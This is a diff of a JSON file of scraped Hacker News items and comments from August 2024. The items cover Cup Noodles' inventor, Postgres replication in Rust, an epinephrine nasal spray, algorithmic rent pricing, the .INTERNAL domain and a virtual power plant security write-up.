+      "Ever since reading \u201cThe Ramen King and I\u201d I\u2019ve been hoping/sporadically searching for a translation of Momofuku Ando\u2019s book of quotes. Hard to even find mention of them\u2026Edit: title is Momofuku Ando Speaks: Human beings are Noodle Beings. https://books.google.com/books/about/Momofuku_Ando_Speaks.ht...\n \nreply",
+      "The Cup of Noodles museum in Yokohama was well worth it (get there early if plan to go though, can get very busy).\n \nreply",
+      "Eh, I had the opposite experience. It\u2019s definitely very geared towards elementary school age children.\n \nreply",
+      "Oh /that's/ where David Chang got the name Momofuku from...? Interesting!\n \nreply",
+      "Yep. It also means \"lucky peach\", which has a lot of positive connotations in Japan. But the original ramen place name was a nod to the inventor.\n \nreply",
+      "I was thinking the same thing!\n \nreply",
+      "I\u2019d like to strongly recommend \u201cProject X: Cup Noodle,\u201d a business manga (who knew! Wish more of these were translated) covering the story of the creation of Cup Noodle. Maybe read it while enjoying the titular product.\n \nreply",
+      "That was awesome, especially the bit about the Asama-Sans\u014d incident. Also made me instantly want some noodles . . . .\n \nreply",
+      "Surprisingly that was a great story.\n \nreply",
+      "Cup Noodles (and more generally instant noodles) is easily one of the most important inventions ever.It's cheap, it's nutritious, it stores well (and easily), it ships easily (read: cheaply), and it prepares simply and quickly. Most importantly, it's delicious.I know of no other food that checks all these boxes and then some.\n \nreply"
+    ],
+    "link": "https://www.nissin.com/en_jp/about/founder/",
+    "first_paragraph": "Ando in the 1930s when he launched one enterprise after another\n          NISSIN FOODS founder Momofuku Ando was born in 1910, a year in which Halley's Comet made a close Earth approach. Ando lost both parents in early childhood and was raised by grandparents who ran a kimono fabric shop, where he gained a close-up view of a place of business. Ando, who was filled with a spirit of independence and strong business drive, desired to do something new that no one else was doing. His first choice of occupation was the textiles business, and at the tender age of twenty-two he founded a company that sold knitted goods, which enjoyed great success. Ando became involved in a variety of other business ventures, including the manufacture of slide projectors, charcoal production, the fabrication of barrack housing, salt production, and the founding of a school. Ando's characteristic entrepreneurial spirit to rapidly commercialize ideas based on a quick grasp of emerging trends. The vitality to per"
+  },
+  {
+    "title": "The surveilled society: Who is watching you and how (rnz.co.nz)",
+    "points": 17,
+    "submitter": "billybuckwheat",
+    "submit_time": "2024-08-11T00:20:41",
+    "num_comments": 0,
+    "comments_url": "",
+    "comments": [
+      "xxx"
+    ],
+    "link": "https://www.rnz.co.nz/news/national/524791/the-surveilled-society-who-is-watching-you-and-how",
+    "first_paragraph": "Save your playlist nowHow to save your playlistFrom 20 August we will launch a new improved audio player. As we do not store any private data \u2014 including your playlist \u2014 items here will no longer be automatically saved. Find out how to save and rebuild your playlist.\nThe wide array of cameras and technology gathering information about our day-to-day life can be hard to get an overview of, says RNZ's Phil Pennington. \nPhoto: Supplied/ Dan Bailey\nAnalysis - Artificial intelligence-enabled cameras on billboards, in bus windshields, on petrol station forecourts and in the checkout at the supermarket - all these are here, or about to be.The selling of surveillance for safety and security's sake has been very successful around the world, and in New Zealand.It has proceeded apace, with barely a blip - though just this week a legal challenge to it has been playing out in the Auckland District Court, without any coverage by the media.In that hearing, expected to involve at least four separate c"
+  },
+  {
+    "title": "Show HN: Pg_replicate \u2013 Build Postgres replication applications in Rust (github.com/supabase)",
+    "points": 121,
+    "submitter": "imor80",
+    "submit_time": "2024-08-10T15:00:41",
+    "num_comments": 10,
+    "comments_url": "https://news.ycombinator.com/item?id=41209994",
+    "comments": [
+      "Hey HN,For the past few months, as part of my job at Supabase, I have been working on pg_replicate. pg_replicate lets you very easily build applications which can copy data (full table copies and cdc) from Postgres to any other data system. Around six months back I was figuring out what can be built by tailing Postgres' WAL. pg_replicate grew organically out of that effort. Many similar tools, like Debezium, exist already which do a great job, but pg_replicate is much simpler and focussed only on Postgres. Rust was used in the project because I am most comfortable with it. pg_replicate abstracts over the Postgres logical replication protocol[0] and lets you work with higher level concepts. There are three main concepts to understand pg_replicate: source, sink and pipeline.1/ A source is a Postgres db from which data is to be copied.\n2/ A sink is a data system into which data will be copied.\n3/ A pipeline connects a source to a sink.Currently pg_replicate supports BigQuery, DuckDb local file and, MotherDuck as sinks. More sinks will be added in future. To support a new data system, you just need to implement the BatchSink trait (older Sink trait will be deprecated soon).pg_replicate is still under heavy development and is a little thin on documentation. Performance is another area which hasn't received much attention. We are releasing this to get feedback from the community and are still evaluating how (or if) we can integrate it with the Supabase platform. Comments and feedback are welcome.[0] Postgres logical replication protocol: [https://www.postgresql.org/docs/current/protocol-logical-rep...)\n \nreply",
+      "I\u2019m curious in your experience how many clients can run pg_replicate at once?With MySQL I saw the interesting use-case of the black hole storage engine to scale out replication logs but ultimately the only usage I\u2019m aware of was for scaling other mysql read replicas.The idea of scaling an application by tailing logs from a database sounds very interesting to me, and I\u2019m curious if you\u2019ve explored this at all.  There\u2019s of course things like Kafka (and then things like Debezium), but it\u2019s hard to beat direct!\n \nreply",
+      "This is so cool! I appreciate Debezium for its wide DB support (no part of me wants to know the inner workings of MSSQL's replication protocol) but it's finnicky to run. Great to have an alternative, at least for postgres.\n \nreply",
+      "I've recently been playing with the logical replication protocol, and it enables all kinds of interesting usages. one really cool thing is that you see the transactional boundaries, so not only can you write a cache, you can do so in a way thats internally consistent.its also inherently much nicer than listen/notify, since you don't have to go back and figure out what data was associated with the event\n \nreply",
+      "This is super timely.Windmill (https://windmill.dev) used to only support webhooks to trigger code and flow jobs. We have just added email support building our own MX server, and wanted to add CDC change. We were gonna do it on Debezium but this will allow us to remove the need for a third-party service and just add this as a crate. Thank you supabase for open-sourcing this.\n \nreply",
+      "Postgres + Rust is one of the most exciting intersections of tech I've seen in a while.There's external tooling like his project, but postgres extensions in Rust are exciting.Full extensions via pgrx have been cool to see, but plrust + pg_tle is also starting to show up.If you aren't familiar with TLE (Trusted Language Extensions), it is a postgres extension from AWS that created some privileged interfaces for procedural languages (used for user-defined functions) to do some extra stuff. Right now it's mostly auth-related hooks but my hope is that it expands in the future.Plrust is a procedural language extension for Rust, allowing user defined functions written in Rust.The combination of those two could open up a world of rich extensions usable in managed hosted environments like RDS.\n \nreply",
+      "I was trying out the stdout example. Could not get it to log anything. DuckDB example worked so I went digging into the source. Apparently the stdout sink is using tracing and I did not have a `RUST_LOG` env var set.Might be a good idea to have it documented or have the default level set to info for the stdout example.Maybe this is common Rust knowledge and I just don't know what I'm doing though.\n \nreply",
+      "I too consider this a footgun.Most applications will have something like   tracing_subscriber::registry()\n           .with(\n               tracing_subscriber::EnvFilter::try_from_default_env()\n                   .unwrap_or_else(|_| \"my_app=info\".into()),\n           )\n           .with(tracing_subscriber::fmt::layer())\n           .init();\n\n\nin the `main.rs` which will default the tracing if RUST_LOG env var is not set.\n \nreply",
+      "Nice! I'm one of the authors of pg-bifrost which is in the same space. Have you thought about / have solved sharding consumption across multiple slots / multi consumers to increase throughput? This is on my radar but not something I've investigated yet.The issue we've ran into is some team at work decides to re-write an entire table and things get backed up until they stop updating rows.\n \nreply",
+      "Wow I think i build one of the first pg-rust-cdc replication module for postgresql and now it seems mainstream. It was a part of my https://github.com/posix4e/rpgffi project, which is garbage code I'm now embarrassed about. Rust programming has come a long way and we didn't have the best practices. Now it seems actual grownup engineering teams are living the dream. We truly live in the best of all universes.\n \nreply"
+    ],
+    "link": "https://github.com/supabase/pg_replicate",
+    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n          pg_replicate is a Rust crate to quickly build replication solutions for Postgres. It provides building blocks to construct data pipelines which can continually copy data from Postgres to other systems. It builds abstractions on top of Postgres's logical streaming replication protocol and pushes users towards the pit of success without letting them worry about low level details of the protocol.To quickly try out pg_replicate, you can run the stdout example, which will replicate the data to standard output. First, create a publication in Postgres which includes the tables you want to replicate:Then run the stdout example:In the above example, pg_replicate connects to a Postgres database named postgres running on localhost:5432 with a username postgres and password password. The slot name stdout_slot will be created by pg_replicate automaticall"
+  },
+  {
+    "title": "Interval parsing grammars for file format parsing (2023) (acm.org)",
+    "points": 88,
+    "submitter": "fanf2",
+    "submit_time": "2024-08-10T17:42:02",
+    "num_comments": 19,
+    "comments_url": "https://news.ycombinator.com/item?id=41211039",
+    "comments": [
+      "xxx"
+    ],
+    "link": "https://dl.acm.org/doi/10.1145/3591264",
+    "first_paragraph": ""
+  },
+  {
+    "title": "A wonderful coincidence or an expected connection: why \u03c0\u00b2 \u2248 g (roitman.io)",
+    "points": 355,
+    "submitter": "signa11",
+    "submit_time": "2024-08-10T12:24:54",
+    "num_comments": 237,
+    "comments_url": "https://news.ycombinator.com/item?id=41208988",
+    "comments": [
+      "xxx"
+    ],
+    "link": "https://roitman.io/blog/91",
+    "first_paragraph": "BlogContactLet\u2019s take a brief trip back to our school years and recall some lessons in mathematics and physics. Do you remember what the number \u03c0 equals? And what is \u03c0 squared? That\u2019s a strange question too. Of course, it\u2019s 9.87. And do you remember the value of the acceleration due to gravity, g? Of course, that number was drilled into our memory so thoroughly that it\u2019s impossible to forget: 9.81 m/s\u00b2. Naturally, it can vary, but for solving basic school problems, we typically used this value.August 9, 2024And now, here\u2019s the next question: how on earth is it that \u03c0\u00b2 is approximately equal to g? You might say that such questions aren\u2019t asked in polite society. First of all, they aren\u2019t exactly equal. There\u2019s already a difference in the second decimal place. Secondly, \u03c0 is a dimensionless number, while g is a physical quantity with its own units.And yet, no matter how you look at it, this can\u2019t just be a simple coincidence.Let's start by taking a close look at the right side. The value"
+  },
+  {
+    "title": "How the SNES Graphics System Works (fabiensanglard.net)",
+    "points": 44,
+    "submitter": "ingve",
+    "submit_time": "2024-08-10T05:48:43",
+    "num_comments": 3,
+    "comments_url": "https://news.ycombinator.com/item?id=41207608",
+    "comments": [
+      "xxx"
+    ],
+    "link": "https://fabiensanglard.net/snes_ppus_how/index.html",
+    "first_paragraph": ""
+  },
+  {
+    "title": "A/B testing mistakes I learned the hard way (posthog.com)",
+    "points": 27,
+    "submitter": "Lior539",
+    "submit_time": "2024-08-07T11:45:23",
+    "num_comments": 4,
+    "comments_url": "https://news.ycombinator.com/item?id=41180356",
+    "comments": [
+      "xxx"
+    ],
+    "link": "https://newsletter.posthog.com/p/ab-testing-mistakes-i-learned-the",
+    "first_paragraph": ""
+  },
+  {
+    "title": "US FDA approves nasal spray alternative to EpiPen for allergic reactions (reuters.com)",
+    "points": 83,
+    "submitter": "sweca",
+    "submit_time": "2024-08-10T21:30:46",
+    "num_comments": 19,
+    "comments_url": "https://news.ycombinator.com/item?id=41212364",
+    "comments": [
+      "I don't care about the needleless part. The autoinjectors are easy to use and you never see the needle. This is the real win:> The shelf life of neffy is 30 months and allows for temperature exposure up to 122\u00b0F (50\u00b0C), making it a potentially effective treatment if left in a car or outside for a length of time. If accidentally frozen, neffy can be thawed and administered. [1]The need to keep Epi-Pens below 77 degrees F (86F for short periods) is extremely constraining for something that you are supposed to carry with you at all times. Even keeping it in a jeans pocket next to your skin may not be acceptable, technically. If it's hot outside, you can't leave it in your car or even in a bag you're carrying. You're supposed to carry a thermos bottle with you the whole day every day or something? Obviously very few people do that. This is going to be far better for that reason alone. And double the shelf life is very welcome too.[1] https://ir.ars-pharma.com/news-releases/news-release-details...\n \nreply",
+      "As a practical matter epi-pens work just fine outside spec. Heat just speeds up the degradation. Also see https://www.foodallergy.org/fare-blog/expired-epinephrine-ca...> Forty EpiPen and EpiPen Jr auto-injectors that had been expired for 1 to 50 months were tested. All 40 auto-injectors contained more than 80 percent of the labeled dose\n \nreply",
+      "My first question is what took so long?For epilepsy, rescue meds to prevent one seizure from triggering another have started coming in the form of nasal spray have been on the market since 2019. Before that, outside of hospitals you either had to put a pill under someone\u2019s tongue or cream\nin their butthole. You couldn\u2019t put it under their tounge during a seizures out of risk they\u2019d bite your finger (I\u2019m currently recovering from a tongue bite I got after having a seizure while alone 8 days ago, it\u2019s pretty horrible. Amazing the amount of power the teeth/jaw can have) and let\u2019s just say the butthole option is unappealing.My second question is should I invest in the company?  This seems like it has the potential to sell a ton. And if it\u2019s priced anything like the nasal rescue med for epilepsy it\u2019s not gonna be cheap (the epilepsy nasal sprays are about $300 each without insurance, the same med in pill form is about 10 cents. Yes, I\u2019ve struggled a lot over the years with the level of privilege and inequality that having access to them reflects)\n \nreply",
+      "> ARS Pharma will offer neffy at a price of $199 for two doses via digital pharmacy sites like BlinkRx and GoodRx for eligible patients whose insurance plans do not cover neffy. Some commercially insured patients can access the treatment at $25 for each filled prescription of two single-use neffy devices through a co-pay savings program.This is considerably lower than the non-insured cost of an Epi-Pen or generic equivalent[0]. Hopefully this spurs some competition and makes the whole market more affordable. I needed to use an Epi-pen in college, and though I never took issue with needles I'm glad than an alternative is available for those fearful of them.(I didn't feel it. I was about to pass out. But I remember looking up from the floor while administering and seeing my RA terrified. He was so scared of needles that if I had lost consciousness, he wouldn't have administered for me!)[0]https://www.talktomira.com/post/how-much-does-an-epipen-cost\n \nreply",
+      "I knew someone that was\u2026 violently, ridiculously afraid of needles and to have them describe the time they had to stab a roommate with an EliPen \u2014 after failing to find a Good Samaritan to do it \u2014 it was like hearing someone describe getting the courage to take a life or something, some kind of war story. He did finally do it, though. He also puked on the person.\n \nreply",
+      "Not only is it cheaper, but you need to replace it much less as its shelf life is 30 months[0], compared to Epipens which are recommended every year of shelf life.[0]: https://ir.ars-pharma.com/news-releases/news-release-details...\n \nreply",
+      "The cheapest generic is $110 without insurance at CVS for two doses.https://www.cvs.com/content/epipen-alternative(Sometimes you could need two doses in the event of an emergency, according to doctors.)I know this because I've been buying them for years without use (thankfully), on the off chance my son has a life threatening reaction to eggs.\n \nreply",
+      "This is HUGE for kids.  Nasal spray as a delivery method is a big step up from needles, the shelf life is much longer, it's less susceptible to high/low temperatures, and if the promotional pricing is accurate, it's cheaper than EpiPens and Auvi-Q (which talks you through the injection procedure).I wouldn't be surprised, though, if insurers continue to push generic epinephine injectors ($15-$30) merely from a cost perspective.\n \nreply",
+      "Hmm... Canada had something like Auvi-Q called Allerject but it was recalled due to mechanical malfunctions.https://www.cbc.ca/news/health/epipen-shortage-canada-1.3296...\n \nreply",
+      "Slam dunk against EpiPen\u2019s de facto monopoly.\n \nreply"
+    ],
+    "link": "https://www.reuters.com/business/healthcare-pharmaceuticals/us-fda-approves-first-nasal-spray-allergic-reactions-2024-08-09/",
+    "first_paragraph": ""
+  },
+  {
+    "title": "Imagining a personal data pipeline (joshcanhelp.com)",
+    "points": 25,
+    "submitter": "surprisetalk",
+    "submit_time": "2024-08-07T18:06:44",
+    "num_comments": 7,
+    "comments_url": "https://news.ycombinator.com/item?id=41183795",
+    "comments": [
+      "xxx"
+    ],
+    "link": "https://www.joshcanhelp.com/personal-data-pipeline/",
+    "first_paragraph": "Home \u203a Posts \u203a Jul 31, 2024I've been thinking a lot about personal data lately, the stuff that accrues as we live our lives in the presence of machines. About a year ago, I wrote down my thoughts on my own personal data: where it collects, what shape it takes, how it could be used.The amount of data exhaust that we're all generating is pretty staggering. I'm fairly cautious about what I sign up for but I'm still finding more and more sources of data I can export and use. It's a bit of a bind, to be honest; I love having this data available to me but I don't love allowing companies to collect it ... What I am truly cautious about, though, is how much time I spend recording and collecting and transforming ... There is a whole bunch of toil baked into this hobby and I'm wary of creating an endless source of digital chores for myself ... I want to make it easy to collect as much of my own raw data as possible, even if I don't know exactly what I want to do with it right now.Up until the en"
+  },
+  {
+    "title": "Animated Film Making Process (disneyanimation.com)",
+    "points": 26,
+    "submitter": "oumua_don17",
+    "submit_time": "2024-08-09T18:30:18",
+    "num_comments": 0,
+    "comments_url": "",
+    "comments": [
+      "xxx"
+    ],
+    "link": "https://disneyanimation.com/process/",
+    "first_paragraph": "DISNEY ANIMATIONDISNEY ANIMATION CAREERS\u00a0What We DoEach department works together to bring us the big picture. From sequence to shot to frame, the film comes together through the deep collaboration between everyone at the studio.Wish\u00a0has a total run time of 94 minutes and 56 seconds.\u00a0\nWish\u00a0has a total run time of 94 minutes and 56 seconds.\u00a0Wish\u00a0had 32 sequences that ranged from 57 seconds to 6 minutes.\nWish\u00a0had 32 sequences that ranged from 57 seconds to 6 minutes.Sequence 100\u00a0contains 59 shots and is 2 minutes and 57 seconds long.Sequence 100\u00a0contains 59 shots and is 2 minutes and 57 seconds long.Frame 01Click on the image below to toggle between the left eye and right eye images.The fairytale illustration styles of many Disney artists, including Gustaf Tenggren and Kay Nielsen, inspired the unique style of\u00a0Wish.\nThe fairytale illustration styles of many Disney artists, including Gustaf Tenggren and Kay Nielsen, inspired the unique style of\u00a0Wish.Shorts, such as Paperman, Feast, and Fa"
+  },
+  {
+    "title": "Shanghai's Automotive Metamorphosis (arun.is)",
+    "points": 23,
+    "submitter": "surprisetalk",
+    "submit_time": "2024-08-10T03:16:14",
+    "num_comments": 7,
+    "comments_url": "https://news.ycombinator.com/item?id=41207048",
+    "comments": [
+      "xxx"
+    ],
+    "link": "https://arun.is/blog/shanghai-cars/",
+    "first_paragraph": "6 min read\u2002\u2002August 3, 2024\u2002\u2002#Photoessays\u2002#AsiaIn 2005, I landed in China, clutching my prized fourth-generation iPod. My\nexcitement quickly diminished when I realized I had forgotten the charger.Locals were perplexed when I asked them for help. They\u2019d never seen such a\ndevice, let alone knew where to find a charger. Little did I know, this moment\nof technological disconnect would become a quaint memory in the face of China\u2019s\nimpending digital revolution.Fast forward to 2023, and the tables had turned \u2014 I was the bewildered one.\nCraving a simple coffee, I found myself in a high-tech puzzle. The coffee shop\nhad no menu or prices in sight, just a massive QR code. The staff thankfully\ndirected me to scan the QR code with Alipay , bringing up the shop\u2019s mini-app\nwithin which I could view the menu, pay, and check on my order.The China I knew was replaced by a sci-fi vision of the future. Sure, economic\nfigures could tell this story. But for a car enthusiast like me, the real tale\nwas written"
+  },
+  {
+    "title": "Algorithmic price-fixing of rents is here (theatlantic.com)",
+    "points": 40,
+    "submitter": "jtotheh",
+    "submit_time": "2024-08-10T22:11:24",
+    "num_comments": 19,
+    "comments_url": "https://news.ycombinator.com/item?id=41212616",
+    "comments": [
+      "It is completely anecdotal but in my local experience I've seen the following pattern happen: rent is increased substantially, present tenants move out, no one new applies, unit becomes empty, rent is decreased until someone new finally moves in.  I'm not a landlord but I don't think there is a rational basis for kicking all of your rent paying tenants out and then having half a dozen units go empty in the hope that you can squeeze an extra 100 every month out of someone, maybe, in the future.\n \nreply",
+      "This is only irrational for the landlords, not the software suggesting prices to them. If you churn 10% of your units, but prices go up by 20%, then you're making more money a rental management company.\n \nreply",
+      ">rent is increased substantially>[...] in the hope that you can squeeze an extra 100 every month [...]Which one is it? Was the increase \"substantial\" or was it only 100 bucks?> I'm not a landlord but I don't think there is a rational basis for kicking all of your rent paying tenants out and then having half a dozen units go empty in the hope that you can squeeze an extra 100 every month out of someone, maybe, in the future.Hindsight is 20/20. My guess is that the landlord thought the market was going to bear the price increase, and went all-in on it rather than only doing it on a portion of his tenants.\n \nreply",
+      "> Which one is it? Was the increase \"substantial\" or was it only 100 bucks?A 100 increase over 800 is a 12.5% increase, which is substantial relatively speaking.  In my case they wanted 150 over 800 which is an 18.75% increase.  After I said no (as well as everyone else in the complex) they wanted 1000 which is a 20% increase.  I have to say your comment comes off as condescending to me.  For many people $100 may be the difference between being able to afford a home and being homeless.  Now everyone has left, the units are all empty, and they are asking for 800 (after asking 950, then 900, then 850).> Hindsight is 20/20. My guess is that the landlord thought the market was going to bear the price increase, and went all-in on it rather than only doing it on a portion of his tenants.That is one way to describe it.  Or, to describe what you said in other words, trying to squeeze every penny out of tenants, creating an inconvenience for five people (who would have probably rather stayed and put up with a modest 2-5% increase), then losing money after all because all of the properties are now vacant.\n \nreply",
+      "> I have to say your comment comes off as condescending to me. For many people $100 may be the difference between being able to afford a home and being homeless.The implication that $100 isn't a lot of money comes from your original comment, not me. After all, the thesis in your original comment was that the landlord risked a bunch of reliable tenants for a small rent increase. It wouldn't have made sense otherwise (eg. the landlord risking the current tenants for a chance of $500 rent increase).\n \nreply",
+      "Now I see the source of confusion.  I think $100 from the perspective of a tenant may be quite a lot (as mentioned a 12.5% increase).  However as you said my thesis is from a landlord's perspective $100 is insignificant with all things considered.  If even one unit were empty for two months, that would be an annual loss greater than the extra money they would make from the previous tenants.  Also in our case they already have had a unit empty for over six months now which further baffles me.  Apologies if I read into your comment too much.",
+      "> Which one is it? Was the increase \"substantial\" or was it only 100 bucks?Not OP, but here is how I interpreted this.Increase rents substantially -> no one takes it -> decrease rents over time until it hits a rate the market can bare -> people move in when rents are 100 dollars above what the previous tenets were paying.\n \nreply",
+      "Anecdata of 1 but. In July 2021 got place for too much $$$. In July 2022 they said the rent was going up $400 a month. I moved out. In July 2023 they were asking $100 less than I was paying in July 2021I have no idea if that was this software or market change or what. It was huge complex. 700-800 units. At the time I just guessed that they raise the rent for everyone when their lease is up because most people don't want to move and will put up with the rent increase even if they hate it.For me, the place had issues. If the rent had stayed the same I'd have put up with them just because it's easier to put off finding a new place, but $400 a month was enough for me to just move.\n \nreply",
+      "Markets are rational eventually but the keyword is eventually. No timeline is provided.\n \nreply",
+      "Yeah, that's weirdly inefficient and annoying for everyone. What would be great would be if there was some algorithmic way to determine the market value for an apartment to minimize vacancy and be fair to both the current tenants and those that want to move in\n \nreply"
+    ],
+    "link": "https://www.theatlantic.com/ideas/archive/2024/08/ai-price-algorithms-realpage/679405/",
+    "first_paragraph": "Algorithmic collusion appears to be spreading to more and more industries. And existing laws may not be equipped to stop it.If you rent your home, there\u2019s a good chance your landlord uses RealPage to set your monthly payment. The company describes itself as merely helping landlords set the most profitable price. But a series of lawsuits says it\u2019s something else: an AI-enabled price-fixing conspiracy.The classic image of price-fixing involves the executives of rival companies gathering behind closed doors and secretly agreeing to charge the same inflated price for whatever they\u2019re selling. This type of collusion is one of the gravest sins you can commit against a free-market economy; the late Justice Antonin Scalia once called price-fixing the \u201csupreme evil\u201d of antitrust law. Agreeing to fix prices is punishable with up to 10 years in prison and a $100 million fine.But, as the RealPage example suggests, technology may offer a workaround. Instead of getting together with your rivals and "
+  },
+  {
+    "title": "DEF CON's response to the badge controversy (reddit.com)",
+    "points": 182,
+    "submitter": "mmastrac",
+    "submit_time": "2024-08-10T19:07:23",
+    "num_comments": 148,
+    "comments_url": "https://news.ycombinator.com/item?id=41211519",
+    "comments": [
+      "xxx"
+    ],
+    "link": "https://old.reddit.com/r/Defcon/comments/1ep00ln/def_cons_response_to_the_badge_controversy/",
+    "first_paragraph": ""
+  },
+  {
+    "title": "A 1940 Letter of Andr\u00e9 Weil on Analogy in Mathematics (2003) [pdf] (ams.org)",
+    "points": 68,
+    "submitter": "gone35",
+    "submit_time": "2024-08-07T07:31:12",
+    "num_comments": 16,
+    "comments_url": "https://news.ycombinator.com/item?id=41179043",
+    "comments": [
+      "xxx"
+    ],
+    "link": "https://www.ams.org/notices/200503/fea-weil.pdf",
+    "first_paragraph": ""
+  },
+  {
+    "title": "OneText (YC W23) is hiring a lead TypeScript/Node engineer (gist.github.com)",
     "points": 0,
     "submitter": "",
-    "submit_time": "2024-08-10T01:01:02",
+    "submit_time": "2024-08-10T17:00:01",
     "num_comments": 0,
     "comments_url": "",
     "comments": [
       "xxx"
     ],
-    "link": "https://www.ycombinator.com/companies/gym-class-by-irl-studios/jobs/7UKmLED-lead-animation-engineer",
-    "first_paragraph": "Play basketball in virtual realityGym Class is the best rated experience on Meta Quest, and #1 most played sports game in VR. Millions have downloaded GC to step on the VR basketball court (+ now football, baseball, and more) and make new friends, compete in simulation gameplay, and even break a sweat. Join us on our mission to connect the world by simulating it!WHAT YOU'LL DOAs Lead Animation Engineer, you'll drive our animation gameplay and systems roadmap, and balance shipping product with applied research at the intersection of character motion AI, spatial computing, and social gaming. Your work is pivotal towards facilitating infinite, personalized social experiences for the Gym Class community. Your scope will first focus on:In this role, you'll collaborate with our co-founders, gameplay & ai engineers, artists, and designers. You'll ship great work directly to a large and eager community, while also building the foundations for a fast-moving Animation Engineering squad.QUALIFICA"
-  },
-  {
-    "title": ".INTERNAL is now reserved for private-use applications (icann.org)",
-    "points": 159,
-    "submitter": "joncfoo",
-    "submit_time": "2024-08-09T16:36:50",
-    "num_comments": 83,
-    "comments_url": "https://news.ycombinator.com/item?id=41203368",
-    "comments": [
-      "My biggest frustration with .internal is that it requires a private certificate authority. Lots of organizations struggle to fully set up trust for the private CA on all internal systems. When you add BYOD or contractor systems, it's a mess.Using a publicly valid domain offers a number of benefits, like being able to use a free public CA like Lets Encrypt. Every machine will trust your internal certificates out of the box, so there is minimal toil.Last year I built getlocalcert [1] as a free way to automate this approach. It allows you to register a subdomain, publish TXT records for ACME DNS certificate validation, and use your own internal DNS server for all private use.[1] https://www.getlocalcert.net/\n \nreply",
-      "Do you mean to say that your biggest frustration with HTTPS on .internal is that it requires a private certificate authority? Because I'm running plain HTTP to .internal sites and it works fine.\n \nreply",
-      "There's some every packet shall be encrypted, even in minimal private VPCs lore going on. I'm blaming PCI-DSS.\n \nreply",
-      "> Lots of organizations struggle to fully set up trust for the private CA on all internal systems.Made worse by the fact phone OSes have made it very difficult to install CAs.\n \nreply",
-      "And in on some platforms and configurations, impossible.Same with the .dev domain\n \nreply",
-      ".dev isn\u2019t a TLD for internal use though, do you have the same problem when you use .test?\n \nreply",
-      "Oh neat, thanks for sharing this idea\n \nreply",
-      "I'm pretty sure that if letsencrypt localhost certs work, they'll work fine with .internal too?\n \nreply",
-      "let\u2019s encrypt does not support certain for localhost.\n \nreply",
-      "Are there any good reasons to use a TLD like .internal for private-use applications, rather than just a regular gTLD like .com?It's nice that this is available, but if I was building a new system today that was internal, I'd use a regular domain name as the root. There are a number of reasons, and one of them is that it's incredibly nice to have the flexibility to make a name visible on the Internet, even if it is completely private and internal.You might want private names to be reachable that way if you're following a zero-trust security model, for example; and even if you aren't, it's helpful to have that flexibility in the future. It's undesirable for changes like these to require re-naming a system.Using names that can't be resolved from the Internet feels like all downside. I think I'd be skeptical even if I was pretty sure that a given system would not ever need to be resolved from the Internet. [Edit:] Instead, you can use a domain name that you own publicly, like `example.com`, but only ever publish records for the domain on your private network, while retaining the option to publish them publicly later.When I was leading Amazon's strategy for cloud-native AWS usage internally, we decided on an approach for DNS that used a .com domain as the root of everything for this reason, even for services that are only reachable from private networks. These services also employed regular public TLS certificates too (by default), for simplicity's sake. If a service needs to be reachable from a new network, or from the Internet, then it doesn't require any changes to naming or certificates, nor any messing about with CA certs on the client side. The security team was forward-thinking and was comfortable with this, though it does have tradeoffs, namely that the presence of names in CT logs can reveal information.\n \nreply"
-    ],
-    "link": "https://www.icann.org/en/board-activities-and-meetings/materials/approved-resolutions-special-meeting-of-the-icann-board-29-07-2024-en#section2.a",
-    "first_paragraph": "Board Activities and MeetingsWhereas, on 1 March 2019, the Board took action on each of the 35 recommendations issued within the Competition, Consumer Trust, and Consumer Choice (CCT) Review Team Final Report dated 8 September 2018, as specified within the scorecard titled \"Final CCT Recommendations: Board Action (1 March 2019)\". The Board resolved to place 17 CCT recommendations into pending status (in whole or in part), and committed to take further action on these recommendations subsequent to the completion of intermediate steps identified in the scorecard.\nWhereas, on 22 October 2020, the Board resolved to take action on 11 of the 17 CCT pending recommendations, as specified within the scorecard titled \"Competition, Consumer Trust, Consumer Choice Review Team (CCT-RT) Pending Recommendations: Board Action on 11 Recommendations\".\nWhereas, on 10 September 2023, the Board took action on two CCT pending recommendations as specified within the scorecard titled \"Board Action/Rationale o"
-  },
-  {
-    "title": "Hacking a Virtual Power Plant (rya.nc)",
-    "points": 63,
-    "submitter": "bo0tzz",
-    "submit_time": "2024-08-08T18:52:57",
-    "num_comments": 17,
-    "comments_url": "https://news.ycombinator.com/item?id=41194929",
-    "comments": [
-      "> A major selling point for me was that they have a local network API which can be used to monitor and control everything without relying on their cloud services.That would be a MAJOR selling point for me, too! Especially because most of the companies that do this for residential are getting a huge portion of the profits using YOUR batteries, rather than getting that profit yourself. Unfortunately, where I live, that is mostly because energy utilities are hostile to anyone except large middlemen installers and their VPPs. It would be simple for them to also allow individuals to sign up for dispatch if they were half-competent. I can't find any companies providing battery systems plus solar that are able to be fully local in my area of the USA, either, even if I wanted to try and go \"off grid\" using massively overbuilt batteries linked to solar.\n \nreply",
-      "> the legitimate ones I\u2019d initially generated still workedThis spooks me. I take this to mean either:- They are still using the compromised key for validation, meaning if you have access to any old token, you can still mutate that, maybe needing to play around with the issuing times- They built an allowlist of all permitted tokens, and check that list first. In which case, might as well use random session ids instead of JWTs, and at the same point where the allowlist is being checked, mutate the request to inject a JWT that the backend can use.Also, kind of curious why the switch to RSA4096 instead of elliptic curves, since they are generally faster / smaller.\n \nreply",
-      "I think very few customers had ever generated API keys, and as best I can tell they made an allowlist for them.One of my suggestions to them was to switch to elliptic curve, but I imagine RSA 4096 \"just worked\".I suspect they'll rework it later now that it's not \"on fire\".\n \nreply",
-      "Ah that makes sense. For sufficiently small values of N, a hardcoded allowlist isn't a problem.You're probably right that RSA 4096 \"just worked\", and some library in their stack doesn't have elliptic curve support. And again, if N is small, the verification performance doesn't matter that much.Nice find and writeup!\n \nreply",
-      "My guess is they are still accepting keys signed with the old 512 key but are currently generating new tokens with a 4096 key.\n \nreply",
-      "The Ars Technica article may also be of interest - it has a statement from the company.https://arstechnica.com/security/2024/08/home-energy-system-...\n \nreply",
-      "I do wonder how you got in contact with them?\nNo security.txt or other obvious ways to report a security issue.\n \nreply",
-      "In the footnotes:> Someone once asked me, as commentary on my ability to figure out email addresses, \u201cAre you a Hacker or in sales?\u201dJust a bit of OSINT and educated guessing.\n \nreply",
-      "It's pretty easy to get in contact with someone most of the time if you search for relevant roles on google with site:linkedin.com, or if you want to reach execs, on their business pages. I usually include several combinations of first and last names @company.com so like I will email to JSmith@company.com and JohnSmith@company.com and others. This is useful for escalating customer service complaints if you're just hitting a brick wall with the low level customer service staff.\n \nreply",
